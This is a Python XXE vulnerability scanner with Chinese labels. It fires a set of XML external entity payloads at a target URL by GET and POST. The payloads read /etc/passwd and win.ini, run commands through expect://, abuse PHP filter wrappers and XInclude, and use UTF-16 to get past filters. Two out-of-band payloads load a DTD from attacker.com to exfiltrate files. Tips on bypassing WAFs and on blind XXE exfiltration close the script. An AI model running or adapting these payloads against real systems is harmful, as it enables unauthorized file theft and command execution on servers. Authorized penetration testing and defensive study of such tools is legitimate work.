#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XXE漏洞扫描器
检测Web应用中是否存在XML外部实体注入漏洞
"""

import requests
import argparse
import sys
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from tqdm import tqdm

requests.packages.urllib3.disable_warnings()

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

TIMEOUT = 15

XXE_PAYLOADS = [
    {
        "name": "基础文件读取",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        "patterns": [r'root:.*:0:0:', r'daemon:.*:1:1:', r'[a-zA-Z_][a-zA-Z0-9_-]*:x:\d+:\d+:'],
        "file_type": "passwd"
    },
    {
        "name": "Windows文件读取",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>""",
        "patterns": [r'\[fonts\]', r'\[extensions\]', r'\[files\]'],
        "file_type": "win_ini"
    },
    {
        "name": "PHP封装器",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>""",
        "patterns": [r'cm9vdD', r'[A-Za-z0-9+/]{50,}'],
        "file_type": "base64_passwd"
    },
    {
        "name": "expect命令执行",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>""",
        "patterns": [r'uid=\d+\([a-zA-Z0-9_-]+\)', r'gid=\d+\([a-zA-Z0-9_-]+\)'],
        "file_type": "command_output"
    },
    {
        "name": "参数实体+文件读取",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "www.example.com">
  %xxe;
]>
<root>test</root>""",
        "patterns": [r'root:.*:0:0:', r'[a-zA-Z_][a-zA-Z0-9_-]*:x:\d+:\d+:'],
        "file_type": "passwd_param"
    },
    {
        "name": "CDATA外带",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>test</root>""",
        "patterns": [],
        "file_type": "oob"
    },
    {
        "name": "UTF-16编码绕过",
        "content_type": "application/xml; charset=UTF-16",
        "payload": """<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        "patterns": [r'root:.*:0:0:', r'[a-zA-Z_][a-zA-Z0-9_-]*:x:\d+:\d+:'],
        "file_type": "passwd_utf16"
    },
    {
        "name": "SOAP格式",
        "content_type": "application/soap+xml",
        "payload": """<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>&xxe;</root>
  </soap:Body>
</soap:Envelope>""",
        "patterns": [r'root:.*:0:0:', r'[a-zA-Z_][a-zA-Z0-9_-]*:x:\d+:\d+:'],
        "file_type": "passwd_soap"
    },
    {
        "name": "SVG文件读取",
        "content_type": "image/svg+xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>""",
        "patterns": [r'root:.*:0:0:', r'[a-zA-Z_][a-zA-Z0-9_-]*:x:\d+:\d+:'],
        "file_type": "passwd_svg"
    },
    {
        "name": "DOCTYPE内部子集",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        "patterns": [r'root:.*:0:0:', r'[a-zA-Z_][a-zA-Z0-9_-]*:x:\d+:\d+:'],
        "file_type": "passwd_internal"
    },
    {
        "name": "XInclude攻击",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>""",
        "patterns": [r'root:.*:0:0:', r'[a-zA-Z_][a-zA-Z0-9_-]*:x:\d+:\d+:'],
        "file_type": "passwd_xinclude"
    },
    {
        "name": "XInclude+PHP",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="php://filter/convert.base64-encode/resource=/etc/passwd"/>
</root>""",
        "patterns": [r'cm9vdD', r'[A-Za-z0-9+/]{50,}'],
        "file_type": "base64_xinclude"
    },
    {
        "name": "盲XXE-FTP外带",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root>test</root>""",
        "patterns": [],
        "file_type": "blind_xxe"
    },
    {
        "name": "错误回显探测",
        "content_type": "application/xml",
        "payload": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistent">
]>
<root>&xxe;</root>""",
        "patterns": [r'failed to load external entity', r'No such file or directory', r'cannot open', r'Could not open', r'FileNotFoundException'],
        "file_type": "error_disclosure"
    },
]

URL_PARAM_NAMES = [
    'xml', 'data', 'content', 'body', 'payload', 'input',
    'request', 'message', 'feed', 'rss', 'soap', 'wsdl',
    'upload', 'import', 'parse', 'transform',
]


def extract_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return {k: v[0] for k, v in params.items()}


def identify_xml_params(url):
    params = extract_params(url)
    xml_params = []
    
    for param_name in params:
        if param_name.lower() in URL_PARAM_NAMES:
            xml_params.append(param_name)
    
    for param_name in params:
        value = params[param_name]
        if value.strip().startswith('<') and 'xml' in value.lower():
            if param_name not in xml_params:
                xml_params.append(param_name)
    
    return xml_params


def test_xxe_get(url, param_name, payload_info, normal_time):
    test_url = url
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param_name] = [payload_info["payload"]]
    new_query = urlencode(params, doseq=True)
    test_url = parsed._replace(query=new_query).geturl()
    
    try:
        headers = DEFAULT_HEADERS.copy()
        
        start_time = time.time()
        response = requests.get(
            test_url,
            headers=headers,
            timeout=TIMEOUT,
            verify=False
        )
        elapsed_time = time.time() - start_time
        
        response_text = response.text
        
        if payload_info.get("patterns"):
            for pattern in payload_info["patterns"]:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return {
                        'url': test_url,
                        'param': param_name,
                        'method': 'GET',
                        'payload_name': payload_info["name"],
                        'file_type': payload_info["file_type"],
                        'evidence': match.group(0)[:200],
                        'status_code': response.status_code,
                        'response_time': round(elapsed_time, 2),
                    }
        
        if elapsed_time > normal_time * 5 and elapsed_time > 5:
            return {
                'url': test_url,
                'param': param_name,
                'method': 'GET',
                'payload_name': payload_info["name"],
                'file_type': 'time_delay',
                'evidence': f"响应时间异常: {elapsed_time:.2f}秒 (正常: {normal_time:.2f}秒)",
                'status_code': response.status_code,
                'response_time': round(elapsed_time, 2),
            }
        
        error_patterns = [
            r'XML', r'xml', r'DOCTYPE', r'Entity', r'entity',
            r'parse', r'Parse', r'SyntaxError', r'syntax',
            r'SAXParseException', r'DOMException',
        ]
        for pattern in error_patterns:
            if re.search(pattern, response_text):
                return {
                    'url': test_url,
                    'param': param_name,
                    'method': 'GET',
                    'payload_name': payload_info["name"],
                    'file_type': 'xml_error',
                    'evidence': f"XML解析错误: {pattern}",
                    'status_code': response.status_code,
                    'response_time': round(elapsed_time, 2),
                }
        
        return None
        
    except Exception:
        return None


def test_xxe_post(url, payload_info, normal_time):
    try:
        headers = DEFAULT_HEADERS.copy()
        headers["Content-Type"] = payload_info["content_type"]
        
        start_time = time.time()
        response = requests.post(
            url,
            data=payload_info["payload"].encode('utf-8'),
            headers=headers,
            timeout=TIMEOUT,
            verify=False
        )
        elapsed_time = time.time() - start_time
        
        response_text = response.text
        
        if payload_info.get("patterns"):
            for pattern in payload_info["patterns"]:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return {
                        'url': url,
                        'param': 'POST_BODY',
                        'method': 'POST',
                        'payload_name': payload_info["name"],
                        'file_type': payload_info["file_type"],
                        'evidence': match.group(0)[:200],
                        'status_code': response.status_code,
                        'response_time': round(elapsed_time, 2),
                    }
        
        if elapsed_time > normal_time * 5 and elapsed_time > 5:
            return {
                'url': url,
                'param': 'POST_BODY',
                'method': 'POST',
                'payload_name': payload_info["name"],
                'file_type': 'time_delay',
                'evidence': f"响应时间异常: {elapsed_time:.2f}秒 (正常: {normal_time:.2f}秒)",
                'status_code': response.status_code,
                'response_time': round(elapsed_time, 2),
            }
        
        error_patterns = [
            r'XML', r'DOCTYPE', r'Entity', r'entity',
            r'SyntaxError', r'syntax', r'parse error',
            r'SAXParseException', r'DOMException',
            r'failed to load external entity',
            r'No such file or directory',
        ]
        for pattern in error_patterns:
            if re.search(pattern, response_text):
                return {
                    'url': url,
                    'param': 'POST_BODY',
                    'method': 'POST',
                    'payload_name': payload_info["name"],
                    'file_type': 'xml_error',
                    'evidence': f"XML解析错误: {pattern}",
                    'status_code': response.status_code,
                    'response_time': round(elapsed_time, 2),
                }
        
        return None
        
    except Exception:
        return None


def scan_xxe(url):
    print(f"[*] 目标URL: {url}")
    
    print(f"[*] 测量正常响应时间...")
    normal_time = 0
    try:
        start = time.time()
        requests.get(url, headers=DEFAULT_HEADERS, timeout=TIMEOUT, verify=False)
        normal_time = time.time() - start
    except:
        normal_time = 1
    print(f"[+] 正常响应时间: {normal_time:.2f}秒")
    
    results = []
    
    xml_params = identify_xml_params(url)
    
    if xml_params:
        print(f"\n[*] 检测到 {len(xml_params)} 个XML相关参数: {xml_params}")
        print(f"[*] 开始GET参数XXE检测...")
        
        total_get = len(xml_params) * len(XXE_PAYLOADS)
        
        with tqdm(total=total_get, desc="GET参数扫描", unit="test") as pbar:
            for param_name in xml_params:
                for payload_info in XXE_PAYLOADS:
                    result = test_xxe_get(url, param_name, payload_info, normal_time)
                    if result:
                        results.append(result)
                        tqdm.write(f"\n[+] 发现XXE漏洞!")
                        tqdm.write(f"    方法: {result['method']}")
                        tqdm.write(f"    参数: {result['param']}")
                        tqdm.write(f"    载荷: {result['payload_name']}")
                        tqdm.write(f"    文件类型: {result['file_type']}")
                        if result.get('evidence'):
                            tqdm.write(f"    证据: {result['evidence'][:150]}")
                    pbar.update(1)
    else:
        print(f"\n[!] 未检测到GET中的XML参数")
    
    print(f"\n[*] 开始POST请求XXE检测...")
    total_post = len(XXE_PAYLOADS)
    
    with tqdm(total=total_post, desc="POST请求扫描", unit="test") as pbar:
        for payload_info in XXE_PAYLOADS:
            result = test_xxe_post(url, payload_info, normal_time)
            if result:
                if not any(r['payload_name'] == result['payload_name'] and r['method'] == 'POST' for r in results):
                    results.append(result)
                    tqdm.write(f"\n[+] 发现XXE漏洞!")
                    tqdm.write(f"    方法: POST")
                    tqdm.write(f"    载荷: {result['payload_name']}")
                    tqdm.write(f"    文件类型: {result['file_type']}")
                    if result.get('evidence'):
                        tqdm.write(f"    证据: {result['evidence'][:150]}")
            pbar.update(1)
    
    return results


def main():
    parser = argparse.ArgumentParser(
        description="XXE漏洞扫描器 - 检测XML外部实体注入漏洞",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python scanner.py -u "http://test.com/api/xml"
  python scanner.py -u "http://test.com/parse.php?xml=<root>test</root>"
  python scanner.py -u "http://test.com/api/xml" -o result.txt
        """
    )
    
    parser.add_argument("-u", "--url", required=True,
                        help="目标URL")
    parser.add_argument("-o", "--output",
                        help="结果输出文件路径")
    
    args = parser.parse_args()
    
    print("=" * 50)
    print("XXE漏洞扫描器")
    print("=" * 50)
    
    results = scan_xxe(args.url)
    
    print(f"\n{'=' * 50}")
    if results:
        print(f"[+] 扫描完成！发现 {len(results)} 个XXE漏洞")
        print("=" * 50)
        
        for i, result in enumerate(results, 1):
            print(f"\n{'─' * 40}")
            print(f"漏洞 {i}:")
            print(f"  方法: {result['method']}")
            print(f"  参数: {result['param']}")
            print(f"  载荷: {result['payload_name']}")
            print(f"  文件类型: {result['file_type']}")
            if result.get('evidence'):
                print(f"  证据: {result['evidence'][:200]}")
    else:
        print("[-] 未发现XXE漏洞")
        print("=" * 50)
    
    if args.output and results:
        with open(args.output, 'w', encoding='utf-8') as f:
            for result in results:
                f.write(f"方法: {result['method']}\n")
                f.write(f"参数: {result['param']}\n")
                f.write(f"载荷: {result['payload_name']}\n")
                f.write(f"文件类型: {result['file_type']}\n")
                f.write(f"URL: {result['url']}\n")
                if result.get('evidence'):
                    f.write(f"证据: {result['evidence']}\n")
                f.write("\n")
        print(f"\n[+] 结果已保存到: {args.output}")
    
    if not results:
        print("\n[*] 提示：")
        print("    1. XXE常见于SOAP接口、RSS订阅、SVG上传、PDF解析等功能")
        print("    2. 盲XXE需要配合外带服务器，尝试使用DNSlog平台")
        print("    3. 部分WAF会过滤DOCTYPE，尝试使用UTF-16编码或XInclude绕过")


if __name__ == "__main__":
    main()